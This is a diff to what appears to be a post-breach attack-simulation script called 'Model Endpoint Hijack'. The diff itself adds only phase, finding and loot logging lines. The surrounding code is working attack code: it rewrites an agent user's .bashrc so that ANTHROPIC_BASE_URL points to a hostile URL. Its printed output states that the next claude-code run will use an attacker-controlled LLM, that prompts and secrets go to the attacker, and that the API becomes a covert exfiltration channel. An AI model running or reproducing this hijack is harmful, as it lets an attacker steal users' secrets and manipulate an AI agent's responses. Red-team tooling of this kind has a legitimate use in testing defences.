@@ -27,6 +27,7 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/lib.sh"
 
 banner "Post-Breach: Model Endpoint Hijack"
+echo "@PHASE Model-Hijack"
 
 PYTHON_CODE='
 import os
@@ -35,6 +36,7 @@ agent_home = "'"$AGENT_HOME"'"
 hostile_url = "'"$HOSTILE_URL"'"
 bashrc = os.path.join(agent_home, ".bashrc")
 
+print("@PHASE Check-Current-Config")
 print("=" * 60)
 print("  AI ATTACK: Model Endpoint Hijack")
 print("=" * 60)
@@ -61,6 +63,7 @@ if "ANTHROPIC_BASE_URL" in existing:
     lines = [l for l in existing.splitlines() if "ANTHROPIC_BASE_URL" not in l]
     existing = "\n".join(lines) + "\n"
 
+print("@PHASE Inject-Override")
 # Append the override
 override = f"export ANTHROPIC_BASE_URL={hostile_url}\n"
 with open(bashrc, "w") as f:
@@ -72,6 +75,9 @@ os.environ["ANTHROPIC_BASE_URL"] = hostile_url
 print()
 print("  .bashrc modified:")
 print(f"    export ANTHROPIC_BASE_URL={hostile_url}")
+print(f"@FINDING critical ANTHROPIC_BASE_URL redirected to {hostile_url}")
+print(f"@LOOT env-vars ANTHROPIC_BASE_URL={hostile_url}")
+print(f"@LOOT persistence-config bashrc:ANTHROPIC_BASE_URL")
 print()
 print("  Effects:")
 print("    - Next claude-code invocation will use the hostile LLM")
@@ -79,6 +85,7 @@ print("    - The hostile LLM can return manipulated responses")
 print("    - All prompts (including secrets in context) go to the attacker")
 print("    - LLM API becomes a covert exfiltration channel")
 print()
+print("@RESULT success Model endpoint hijacked to hostile URL")
 print("Model endpoint hijack complete.")
 '
 
